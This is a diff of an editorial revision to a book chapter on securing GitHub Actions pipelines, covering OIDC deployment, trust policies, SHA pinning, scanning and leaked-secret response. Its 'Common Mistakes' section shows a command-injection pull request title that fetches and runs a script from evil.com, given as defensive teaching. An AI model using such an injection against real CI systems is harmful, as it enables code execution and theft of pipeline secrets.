@@ -18,17 +18,17 @@ in_book: true
 
 ## 💡 The Core Idea
 
-A workflow is a set of jobs, and **every job gets a clean machine**. Jobs run in parallel unless you
+A workflow is a set of jobs, and **every job gets a clean machine** (a runner). Jobs run in parallel unless you
 declare a dependency. Nothing on disk survives between them, so files move as artefacts or caches.
 Design the job graph first and the YAML mostly writes itself.
 
-The second fact is about power. The pipeline holds more privilege than any single developer: the
+The second fact is about power. The pipeline holds more privilege than any single developer. It has the
 source, the cloud credentials, and push access to the registry. A compromised laptop affects one
 engineer. A compromised pipeline signs the attacker's code for them. So reduce what the pipeline
 holds, pin what it consumes, and record what it did.
 
-> ⚠️ **Moving target:** action major versions move roughly yearly — `actions/checkout` is on v6 and
-> `actions/setup-node` on v7 as of 2026. Provenance formats and SLSA levels are still settling too.
+> ⚠️ **Moving target:** action major versions move roughly yearly. As of 2026, `actions/checkout` is on v6 and
+> `actions/setup-node` on v7. Provenance formats and SLSA levels are still settling too.
 > The durable principle: a tag is mutable and a commit SHA or digest is not. Pin by SHA.
 
 ## How It Works
@@ -95,8 +95,8 @@ jobs:
 `concurrency` stops you paying for outdated commits. `fail-fast: false` stops one failing matrix leg
 hiding the others. `cache: npm` takes the install from minutes to seconds.
 
-For integration tests, start a real database as a `services:` container rather than mocking it. Give
-it a `--health-cmd`, or the job races the container and fails about one run in ten.
+For integration tests, start a real database as a `services:` container. Do not mock it. Give it a
+`--health-cmd`. Without one, the job races the container and fails about one run in ten.
 
 The attack paths into a pipeline are few and well known. That is what makes them answerable:
 
@@ -122,7 +122,7 @@ The attack paths into a pipeline are few and well known. That is what makes them
 
 ## Deploying with OIDC — No Static Keys
 
-❌ Long-lived IAM keys stored as repository secrets never rotate, and anyone who reads them can use them.
+❌ Long-lived IAM keys stored as repository secrets never rotate. Anyone who reads them can use them.
 
 ✅ **OIDC federation — credentials that expire in an hour:**
 
@@ -145,11 +145,11 @@ deploy:
         docker push $ECR/api:${{ github.sha }}
 ```
 
-The job asks GitHub for a signed JWT. Its claims name the repository, ref and environment. The cloud
+The job asks GitHub for a signed JWT (a signed token). Its claims name the repository, ref and environment. The cloud
 checks them against a trust policy and returns temporary credentials. Nothing is stored, so nothing
 needs rotating. Naming the session after the run makes every cloud call traceable to one workflow.
 
-**The trust policy is where the security actually lives** — the YAML just asks:
+**The trust policy is where the security actually lives.** The YAML just asks:
 
 ```json
 {
@@ -163,11 +163,11 @@ needs rotating. Naming the session after the run makes every cloud call traceabl
 ```
 
 > ⚠️ **The most common OIDC mistake is a loose `sub` condition.** `repo:acme/*` lets any repository
-> in the organisation assume the production role — including a new one an attacker creates. Pin the
+> in the organisation assume the production role. That includes a new one an attacker creates. Pin the
 > repository, and pin the environment or branch as well.
 
-The `environment` on the job adds rules that live in repository settings, not in the YAML: required
-reviewers, a wait timer, and a branch restriction so only `main` may deploy. For non-cloud secrets,
+The `environment` on the job adds rules that live in repository settings, not in the YAML. They are required
+reviewers, a wait timer, and a branch restriction so only `main` may deploy. For other secrets,
 such as third-party API keys, fetch them from a secrets manager at runtime with the same OIDC identity.
 
 ## Least-Privilege Permissions
@@ -208,12 +208,12 @@ why a self-hosted runner must never serve a public repository: any fork runs cod
 | A typosquatted package | Allowlist registries, proxy through an internal one |
 
 The npm and CI marketplace attacks through 2025 worked because most consumers used mutable tags.
-First-party `actions/*` on a major tag is the accepted trade-off; nothing else.
+First-party `actions/*` on a major tag is the accepted trade-off. Pin everything else by SHA.
 
 Scan dependencies (Dependabot), code (CodeQL) and the built image (Trivy). Fail only on high and
-critical, or the team learns to skip the gate. An **SBOM** lists everything inside the artefact, so
+critical, or the team learns to skip the gate. An **SBOM** (software bill of materials) lists everything inside the artefact, so
 *"are we affected by this CVE?"* becomes a query. Sign the artefact with `cosign` or build provenance
-attestations, and verify the signature at deploy time — a signature nobody checks is only metadata.
+attestations. Then verify the signature at deploy time. A signature nobody checks is only metadata.
 
 The same build and deploy jobs are where release configuration ships, such as the security headers a
 frontend sets. So those headers get the same review and pinning as the code.
@@ -222,16 +222,16 @@ frontend sets. So those headers get the same review and pinning as the code.
 
 A leaked cloud key gives the attacker everything its role can do, until someone rotates it. A leaked
 `GITHUB_TOKEN` with write scope can push code or change a release. Stop secrets reaching the
-repository in layers: a pre-commit hook, push protection at the remote, and a CI scan of full history
-(`fetch-depth: 0`, or it sees only the latest commit).
+repository in layers: a pre-commit hook, push protection at the remote, and a CI scan of full history.
+The scan needs `fetch-depth: 0`, or it sees only the latest commit.
 
 > ⚠️ **A leaked secret is compromised the moment it is pushed**, even if you force-push it away.
-> Forks, clones and CI caches keep copies. Rotate it first, then clean the history — in that order.
+> Forks, clones and CI caches keep copies. Rotate it first, then clean the history. The order matters.
 
 ## Common Mistakes
 
-❌ **Interpolating event data into a `run` block.** A pull request title of `"; curl evil.com/x.sh | sh`
-executes on the runner, because `${{ }}` substitutes before the shell sees the line.
+❌ **Interpolating event data into a `run` block.** Take a pull request title of `"; curl evil.com/x.sh | sh`.
+It executes on the runner, because `${{ }}` substitutes before the shell sees the line.
 ✅ Pass it through `env:` so the shell treats it as data:
 
 ```yaml
@@ -263,12 +263,12 @@ executes on the runner, because `${{ }}` substitutes before the shell sees the l
 
 Use OIDC federation. Register GitHub's issuer in the cloud account, and create a role whose trust
 policy pins the `sub` claim to one repository and one environment. The workflow grants
-`id-token: write` and swaps the JWT for credentials that expire in about an hour. The trust policy,
+`id-token: write`. It swaps the JWT for credentials that expire in about an hour. The trust policy,
 not the YAML, decides who can deploy where.
 
 **Q: What is the risk of `pull_request_target`, and when would you use it?**
 
-It runs in the base repository's context, with secrets and a writable token, while the code may come
+It runs in the base repository's context, with secrets and a writable token. But the code may come
 from an untrusted fork. If it checks out the head commit and runs any install or build step, the
 contributor's code runs with your secrets. Use `pull_request` for contributor code, and keep
 `pull_request_target` for metadata jobs such as labelling.
@@ -289,8 +289,8 @@ plus a service container is the better answer.
 
 **Q: A token leaks from your pipeline. What do you do, and what do you need in place?**
 
-Rotate it first, because it was compromised the moment it was pushed; rewriting history is tidying.
-Then use the cloud audit log to see what the identity did, which only works if role sessions carry
+Rotate it first, because it was compromised the moment it was pushed. Rewriting history is only tidying.
+Then use the cloud audit log to see what the identity did. That only works if role sessions carry
 the run ID. Images tagged with the commit SHA and immutable registry tags prove what actually ran.
 
 ## What to Read Next
